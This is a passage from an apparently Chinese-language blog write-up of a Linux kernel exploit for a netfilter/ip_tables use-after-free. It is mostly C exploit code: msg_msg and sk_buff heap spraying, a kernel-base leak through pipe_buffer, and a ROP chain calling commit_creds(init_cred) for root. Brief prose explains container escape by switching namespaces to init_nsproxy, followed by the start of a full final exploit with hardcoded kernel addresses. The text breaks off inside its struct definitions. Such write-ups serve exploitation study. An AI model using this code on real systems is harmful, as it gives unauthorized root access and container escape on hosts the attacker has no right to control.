*)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/03/31/pwtTNfU3Xa1smzO.png" alt="image.png"></p><h2 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h2><h3 id="Step-VI-切换进程命名空间，完成容器逃逸"><a href="#Step-VI-切换进程命名空间，完成容器逃逸" class="headerlink" title="Step.VI 切换进程命名空间，完成容器逃逸"></a>Step.VI 切换进程命名空间，完成容器逃逸</h3><p>现在我们已经能够在内核空间进行 ROP 了，那么完成容器逃逸其实是顺水推舟的事情，容器常用的隔离手段是利用命名空间进行隔离，因此我们只需要在内核中将进程的命名空间切换为初始的全局命名空间 <code>init_nsproxy</code> 即可完成容器逃逸，执行<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 即可替换掉当前进程的命名空间</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>整合了容器逃逸后的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_PROXY 0xffffffff82a639a0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RSI_RET 0xffffffff811594bd</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RAX_POP_RDI_RET 0xffffffff81159547</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIND_TASK_BY_VPID 0xffffffff810c7d40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TASK_NAMESPACES 0xffffffff810cfc90</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span 